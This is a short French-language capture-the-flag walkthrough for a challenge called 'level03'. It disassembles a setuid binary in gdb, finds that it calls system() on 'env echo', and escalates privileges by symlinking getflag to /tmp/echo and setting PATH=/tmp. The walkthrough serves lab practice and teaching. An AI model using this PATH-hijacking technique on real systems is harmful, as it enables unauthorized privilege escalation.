$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

On a un fichier executable level03

$ ./level03
Exploit me

$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped

On a un fichier binaire qui a les bits setuid et setgid qui son set.
Le bit permettent à un binaire d'être exécuté par n'inmporte qui avec les permissions de son propriétaire plutôt que de celui qui l'éxécute.
On voit aussi que le binaire a été linked dynamiquement et que les symboles des debug ont été conservés.

On l'analyse avec gdb:

$gdb ./level03

$ (gdb) layout asm
$ (gdb) set disassembly-flavor intel 
$ (gdb) start

Le programme est très court, il set les bits setuid et setgid en il fait un appel à system(3)

...
0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
0x080484fe <+90>:	call   0x80483b0 <system@plt>
...

Essayons de voir le paramètre passé à system(3).

$ (gdb) x/s 0x80485e0
0x80485e0:	 "/usr/bin/env echo Exploit me"

On voit que la fonction system est appelée avec le paramètre "/usr/bin/env echo Exploit me"
N'importe qui peut éxécuter getflag.
Nous allons donc creer un faux echo qui va executer getflag et creant un lien symbolique entre getflag et notre faux echo:

$ ln -s /bin/getflag /tmp/echo

ensuite on change la variable d'envirionement PATH pour que la fonction system aille chercher echo dans tmp et non dans bin:
$ PATH=/tmp ./level03:
